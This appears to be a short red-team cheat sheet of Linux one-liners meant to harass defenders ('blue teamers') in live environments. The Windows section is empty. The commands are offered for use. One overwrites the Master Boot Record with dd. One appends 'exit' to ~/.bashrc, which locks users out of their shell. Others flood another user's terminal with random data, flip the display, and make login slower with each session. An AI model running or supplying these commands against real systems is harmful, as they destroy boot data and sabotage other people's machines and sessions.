A small collection of tactics to mess with blue teamers in live environments...

# Linux

```shell
xrandr -o inverted # Flip X11 desktop session upside down.

dd if=nyan.mbr of=/dev/sda # NyanMBR necessary, overwrites Master Boot Recrd with Nyancat animation

echo exit >> ~/.bashrc # Add a logout to the login script

cat /dev/urandom > /dev/pts/<#> # Fill terminal with random noise spewing out at high speed.

echo "echo "sleep 1;" >> ~/.bashrc">> ~/.bashrc # Add a longer sleep to their terminal startup every time they login. 


```

# Windows
